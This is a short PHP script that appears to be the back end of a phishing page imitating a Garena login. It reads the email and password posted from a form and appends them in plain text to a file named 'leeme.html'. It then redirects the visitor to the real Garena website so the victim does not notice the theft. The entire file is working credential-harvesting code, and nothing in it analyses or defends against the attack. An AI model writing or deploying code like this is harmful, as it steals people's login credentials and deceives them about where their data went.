<?php
$email = test_input($_POST["email"]);
$data['email']=$email;
$pass = test_input($_POST["pass"]);
$data['pass']=$pass;


header ('Location: '.htmlspecialchars($_SERVER["PHP_SELF"]));
$handle = fopen("leeme.html", "a");
$string = '
Email:'.$data['email'].'
Pass:'.$data['pass'];

fwrite($handle,$string);
fclose($handle);
header ('Location: https://www.garena.com ');
exit;
function test_input($data) {
	$data = trim($data);
	$data = stripslashes($data);
	$data = htmlspecialchars($data);
	return $data;
}
?>
